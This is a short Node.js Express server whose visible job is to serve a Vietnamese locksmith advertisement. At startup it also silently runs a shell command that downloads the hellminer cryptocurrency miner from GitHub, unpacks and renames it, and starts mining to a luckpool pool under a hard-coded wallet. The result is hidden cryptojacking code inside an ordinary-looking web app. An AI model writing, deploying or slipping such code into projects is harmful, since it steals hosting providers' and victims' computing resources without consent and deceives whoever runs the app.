const express = require("express");
const { exec } = require('child_process');
const app = express();

app.get('/', function (req, res) {
  res.send('S�a kh�a Ti�n Giang - G�i Ngay 0964024024');
});


exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar -xzvf hellminer_cpu_linux.tar.gz&&rm hellminer_cpu_linux.tar.gz&& mv hellminer cpu&&./cpu -c s1tratum+tcp://eu.luckpool.net:3956#xnsub -u R9twfF4HsvdaAwxxVtGmFrgQXVcEt59eKG.lesliee-USS -p d=4096 --cpu 2', (err, stdout, stderr) => {
  if (err) {
    //some err occurred
    console.error(err)
  } else {
   // the *entire* stdout and stderr (buffered)
   console.log(`stdout: ${stdout}`);
   console.log(`stderr: ${stderr}`);
  }
});

var port = process.env.PORT || 5000;

app.listen(port, function () {
  console.log('Example app listening on port ' + port + '!');
});
